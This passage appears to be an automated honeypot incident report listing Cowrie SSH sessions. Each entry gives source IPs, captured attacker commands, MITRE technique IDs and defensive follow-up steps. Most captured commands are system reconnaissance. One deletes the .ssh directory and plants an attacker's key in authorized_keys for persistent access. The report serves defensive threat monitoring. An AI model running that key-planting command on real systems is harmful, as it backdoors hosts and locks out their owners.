| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 07:46:31` | `cowrie.session.connect` |
| `2026-09-04 07:46:34` | `cowrie.client.version` |
| `2026-09-04 07:46:34` | `cowrie.client.kex` |
| `2026-09-04 07:46:46` | `cowrie.login.success` |
| `2026-09-04 07:46:52` | `cowrie.session.params` |
| `2026-09-04 07:46:52` | `cowrie.command.input` |
| `2026-09-04 07:46:52` | `cowrie.command.input` |
| `2026-09-04 07:46:52` | `cowrie.command.input` |
| `2026-09-04 07:46:52` | `cowrie.command.input` |
| `2026-09-04 07:46:52` | `cowrie.command.input` |
| `2026-09-04 07:46:52` | `cowrie.command.success` |
| `2026-09-04 07:46:52` | `cowrie.command.input` |
| `2026-09-04 07:46:52` | `cowrie.command.input` |
| `2026-09-04 07:46:52` | `cowrie.command.input` |
| `2026-09-04 07:46:52` | `cowrie.command.input` |
| `2026-09-04 07:46:54` | `cowrie.log.closed` |
| `2026-09-04 07:46:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c1a59fee2cce

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-09-04 07:47 |
| **Last Seen** | 2026-09-04 07:47 |
| **Session Duration** | 26s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 07:47:17` | `cowrie.session.connect` |
| `2026-09-04 07:47:20` | `cowrie.client.version` |
| `2026-09-04 07:47:20` | `cowrie.client.kex` |
| `2026-09-04 07:47:31` | `cowrie.login.success` |
| `2026-09-04 07:47:37` | `cowrie.session.params` |
| `2026-09-04 07:47:37` | `cowrie.command.input` |
| `2026-09-04 07:47:37` | `cowrie.command.input` |
| `2026-09-04 07:47:37` | `cowrie.command.input` |
| `2026-09-04 07:47:37` | `cowrie.command.input` |
| `2026-09-04 07:47:37` | `cowrie.command.input` |
| `2026-09-04 07:47:37` | `cowrie.command.success` |
| `2026-09-04 07:47:37` | `cowrie.command.input` |
| `2026-09-04 07:47:37` | `cowrie.command.input` |
| `2026-09-04 07:47:37` | `cowrie.command.input` |
| `2026-09-04 07:47:37` | `cowrie.command.input` |
| `2026-09-04 07:47:41` | `cowrie.log.closed` |
| `2026-09-04 07:47:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-08d7d8f2f1ba

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-04 07:47 |
| **Last Seen** | 2026-09-04 07:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 07:47:32` | `cowrie.session.connect` |
| `2026-09-04 07:47:32` | `cowrie.client.version` |
| `2026-09-04 07:47:32` | `cowrie.client.kex` |
| `2026-09-04 07:47:33` | `cowrie.login.success` |
| `2026-09-04 07:47:34` | `cowrie.direct-tcpip.request` |
| `2026-09-04 07:47:34` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-04 07:47:34` | `cowrie.direct-tcpip.data` |
| `2026-09-04 07:47:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-921f33e596ea

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-09-04 07:48 |
| **Last Seen** | 2026-09-04 07:48 |
| **Session Duration** | 26s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 07:48:14` | `cowrie.session.connect` |
| `2026-09-04 07:48:18` | `cowrie.client.version` |
| `2026-09-04 07:48:18` | `cowrie.client.kex` |
| `2026-09-04 07:48:30` | `cowrie.login.success` |
| `2026-09-04 07:48:36` | `cowrie.session.params` |
| `2026-09-04 07:48:36` | `cowrie.command.input` |
| `2026-09-04 07:48:36` | `cowrie.command.input` |
| `2026-09-04 07:48:36` | `cowrie.command.input` |
| `2026-09-04 07:48:36` | `cowrie.command.input` |
| `2026-09-04 07:48:36` | `cowrie.command.input` |
| `2026-09-04 07:48:36` | `cowrie.command.success` |
| `2026-09-04 07:48:36` | `cowrie.command.input` |
| `2026-09-04 07:48:36` | `cowrie.command.input` |
| `2026-09-04 07:48:36` | `cowrie.command.input` |
| `2026-09-04 07:48:36` | `cowrie.command.input` |
| `2026-09-04 07:48:39` | `cowrie.log.closed` |
| `2026-09-04 07:48:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-72322bac2d13

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-09-04 07:49 |
| **Last Seen** | 2026-09-04 07:49 |
| **Session Duration** | 22s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 07:49:11` | `cowrie.session.connect` |
| `2026-09-04 07:49:12` | `cowrie.client.version` |
| `2026-09-04 07:49:12` | `cowrie.client.kex` |
| `2026-09-04 07:49:22` | `cowrie.login.success` |
| `2026-09-04 07:49:29` | `cowrie.session.params` |
| `2026-09-04 07:49:29` | `cowrie.command.input` |
| `2026-09-04 07:49:29` | `cowrie.command.input` |
| `2026-09-04 07:49:29` | `cowrie.command.input` |
| `2026-09-04 07:49:29` | `cowrie.command.input` |
| `2026-09-04 07:49:29` | `cowrie.command.input` |
| `2026-09-04 07:49:29` | `cowrie.command.success` |
| `2026-09-04 07:49:29` | `cowrie.command.input` |
| `2026-09-04 07:49:29` | `cowrie.command.input` |
| `2026-09-04 07:49:29` | `cowrie.command.input` |
| `2026-09-04 07:49:29` | `cowrie.command.input` |
| `2026-09-04 07:49:32` | `cowrie.log.closed` |
| `2026-09-04 07:49:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2d65cbc8f67

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-09-04 07:50 |
| **Last Seen** | 2026-09-04 07:50 |
| **Session Duration** | 25s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 07:50:01` | `cowrie.session.connect` |
| `2026-09-04 07:50:03` | `cowrie.client.version` |
| `2026-09-04 07:50:03` | `cowrie.client.kex` |
| `2026-09-04 07:50:17` | `cowrie.login.success` |
| `2026-09-04 07:50:22` | `cowrie.session.params` |
| `2026-09-04 07:50:22` | `cowrie.command.input` |
| `2026-09-04 07:50:22` | `cowrie.command.input` |
| `2026-09-04 07:50:22` | `cowrie.command.input` |
| `2026-09-04 07:50:22` | `cowrie.command.input` |
| `2026-09-04 07:50:22` | `cowrie.command.input` |
| `2026-09-04 07:50:22` | `cowrie.command.success` |
| `2026-09-04 07:50:22` | `cowrie.command.input` |
| `2026-09-04 07:50:22` | `cowrie.command.input` |
| `2026-09-04 07:50:22` | `cowrie.command.input` |
| `2026-09-04 07:50:22` | `cowrie.command.input` |
| `2026-09-04 07:50:24` | `cowrie.log.closed` |
| `2026-09-04 07:50:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef75d2cbc7d5

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-09-04 07:50 |
| **Last Seen** | 2026-09-04 07:51 |
| **Session Duration** | 28s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 07:50:55` | `cowrie.session.connect` |
| `2026-09-04 07:50:59` | `cowrie.client.version` |
| `2026-09-04 07:50:59` | `cowrie.client.kex` |
| `2026-09-04 07:51:11` | `cowrie.login.success` |
| `2026-09-04 07:51:17` | `cowrie.session.params` |
| `2026-09-04 07:51:17` | `cowrie.command.input` |
| `2026-09-04 07:51:17` | `cowrie.command.input` |
| `2026-09-04 07:51:17` | `cowrie.command.input` |
| `2026-09-04 07:51:17` | `cowrie.command.input` |
| `2026-09-04 07:51:17` | `cowrie.command.input` |
| `2026-09-04 07:51:17` | `cowrie.command.success` |
| `2026-09-04 07:51:17` | `cowrie.command.input` |
| `2026-09-04 07:51:17` | `cowrie.command.input` |
| `2026-09-04 07:51:17` | `cowrie.command.input` |
| `2026-09-04 07:51:17` | `cowrie.command.input` |
| `2026-09-04 07:51:20` | `cowrie.log.closed` |
| `2026-09-04 07:51:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e673f9907a1

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-09-04 07:51 |
| **Last Seen** | 2026-09-04 07:52 |
| **Session Duration** | 25s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 07:51:49` | `cowrie.session.connect` |
| `2026-09-04 07:51:52` | `cowrie.client.version` |
| `2026-09-04 07:51:52` | `cowrie.client.kex` |
| `2026-09-04 07:52:03` | `cowrie.login.success` |
| `2026-09-04 07:52:08` | `cowrie.session.params` |
| `2026-09-04 07:52:08` | `cowrie.command.input` |
| `2026-09-04 07:52:08` | `cowrie.command.input` |
| `2026-09-04 07:52:08` | `cowrie.command.input` |
| `2026-09-04 07:52:08` | `cowrie.command.input` |
| `2026-09-04 07:52:08` | `cowrie.command.input` |
| `2026-09-04 07:52:08` | `cowrie.command.success` |
| `2026-09-04 07:52:08` | `cowrie.command.input` |
| `2026-09-04 07:52:08` | `cowrie.command.input` |
| `2026-09-04 07:52:08` | `cowrie.command.input` |
| `2026-09-04 07:52:08` | `cowrie.command.input` |
| `2026-09-04 07:52:11` | `cowrie.log.closed` |
| `2026-09-04 07:52:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-454523c30099

| Field | Detail |
|---|---|
| **Source IP** | `138.197.164[.]175` |
| **First Seen** | 2026-09-04 07:52 |
| **Last Seen** | 2026-09-04 07:52 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 07:52:00` | `cowrie.session.connect` |
| `2026-09-04 07:52:00` | `cowrie.client.version` |
| `2026-09-04 07:52:00` | `cowrie.client.kex` |
| `2026-09-04 07:52:00` | `cowrie.login.success` |
| `2026-09-04 07:52:01` | `cowrie.session.params` |
| `2026-09-04 07:52:01` | `cowrie.command.input` |
| `2026-09-04 07:52:01` | `cowrie.command.failed` |
| `2026-09-04 07:52:01` | `cowrie.log.closed` |
| `2026-09-04 07:52:02` | `cowrie.session.params` |
| `2026-09-04 07:52:02` | `cowrie.command.input` |
| `2026-09-04 07:52:02` | `cowrie.session.file_download` |
| `2026-09-04 07:52:02` | `cowrie.log.closed` |
| `2026-09-04 07:52:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.197.164[.]175` to AbuseIPDB if not already reported
- [ ] Block `138.197.164[.]175` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b7b30fb3e26

| Field | Detail |
|---|---|
| **Source IP** | `138.197.164[.]175` |
| **First Seen** | 2026-09-04 07:52 |
| **Last Seen** | 2026-09-04 07:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 07:52:02` | `cowrie.session.connect` |
| `2026-09-04 07:52:02` | `cowrie.client.version` |
| `2026-09-04 07:52:02` | `cowrie.client.kex` |
| `2026-09-04 07:52:02` | `cowrie.login.success` |
| `2026-09-04 07:52:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.197.164[.]175` to AbuseIPDB if not already reported
- [ ] Block `138.197.164[.]175` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ab7dad3ef89

| Field | Detail |
|---|---|
| **Source IP** | `138.197.164[.]175` |
| **First Seen** | 2026-09-04 07:52 |
| **Last Seen** | 2026-09-04 07:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 07:52:02` | `cowrie.session.connect` |
| `2026-09-04 07:52:02` | `cowrie.client.version` |
| `2026-09-04 07:52:02` | `cowrie.client.kex` |
| `2026-09-04 07:52:02` | `cowrie.login.success` |
| `2026-09-04 07:52:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.197.164[.]175` to AbuseIPDB if not already reported
- [ ] Block `138.197.164[.]175` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a91358210ce

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-09-04 07:52 |
| **Last Seen** | 2026-09-04 07:53 |
| **Session Duration** | 23s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 07:52:45` | `cowrie.session.connect` |
| `2026-09-04 07:52:46` | `cowrie.client.version` |
| `2026-09-04 07:52:46` | `cowrie.client.kex` |
| `2026-09-04 07:52:58` | `cowrie.login.success` |
| `2026-09-04 07:53:03` | `cowrie.session.params` |
| `2026-09-04 07:53:03` | `cowrie.command.input` |
| `2026-09-04 07:53:03` | `cowrie.command.input` |
| `2026-09-04 07:53:03` | `cowrie.command.input` |
| `2026-09-04 07:53:03` | `cowrie.command.input` |
| `2026-09-04 07:53:03` | `cowrie.command.input` |
| `2026-09-04 07:53:03` | `cowrie.command.success` |
| `2026-09-04 07:53:03` | `cowrie.command.input` |
| `2026-09-04 07:53:03` | `cowrie.command.input` |
| `2026-09-04 07:53:03` | `cowrie.command.input` |
| `2026-09-04 07:53:03` | `cowrie.command.input` |
| `2026-09-04 07:53:05` | `cowrie.log.closed` |
| `2026-09-04 07:53:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-411bf0326cf2

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-09-04 07:53 |
| **Last Seen** | 2026-09-04 07:53 |
| **Session Duration** | 24s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 07:53:34` | `cowrie.session.connect` |
| `2026-09-04 07:53:37` | `cowrie.client.version` |
| `2026-09-04 07:53:37` | `cowrie.client.kex` |
| `2026-09-04 07:53:46` | `cowrie.login.success` |
| `2026-09-04 07:53:53` | `cowrie.session.params` |
| `2026-09-04 07:53:53` | `cowrie.command.input` |
| `2026-09-04 07:53:53` | `cowrie.command.input` |
| `2026-09-04 07:53:53` | `cowrie.command.input` |
| `2026-09-04 07:53:53` | `cowrie.command.input` |
| `2026-09-04 07:53:53` | `cowrie.command.input` |
| `2026-09-04 07:53:53` | `cowrie.command.success` |
| `2026-09-04 07:53:53` | `cowrie.command.input` |
| `2026-09-04 07:53:53` | `cowrie.command.input` |
| `2026-09-04 07:53:53` | `cowrie.command.input` |
| `2026-09-04 07:53:53` | `cowrie.command.input` |
| `2026-09-04 07:53:57` | `cowrie.log.closed` |
| `2026-09-04 07:53:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef65c3c8332a

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-09-04 07:54 |
| **Last Seen** | 2026-09-04 07:54 |
| **Session Duration** | 27s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 07:54:28` | `cowrie.session.connect` |
| `2026-09-04 07:54:30` | `cowrie.client.version` |
| `2026-09-04 07:54:30` | `cowrie.client.kex` |
| `2026-09-04 07:54:47` | `cowrie.login.success` |
| `2026-09-04 07:54:52` | `cowrie.session.params` |
| `2026-09-04 07:54:52` | `cowrie.command.input` |
| `2026-09-04 07:54:52` | `cowrie.command.input` |
| `2026-09-04 07:54:53` | `cowrie.command.input` |
| `2026-09-04 07:54:53` | `cowrie.command.input` |
| `2026-09-04 07:54:53` | `cowrie.command.input` |
| `2026-09-04 07:54:53` | `cowrie.command.success` |
| `2026-09-04 07:54:53` | `cowrie.command.input` |
| `2026-09-04 07:54:53` | `cowrie.command.input` |
| `2026-09-04 07:54:53` | `cowrie.command.input` |
| `2026-09-04 07:54:53` | `cowrie.command.input` |
| `2026-09-04 07:54:54` | `cowrie.log.closed` |
| `2026-09-04 07:54:55` | `cowrie.session.closed` |

**Recommended Actions:**
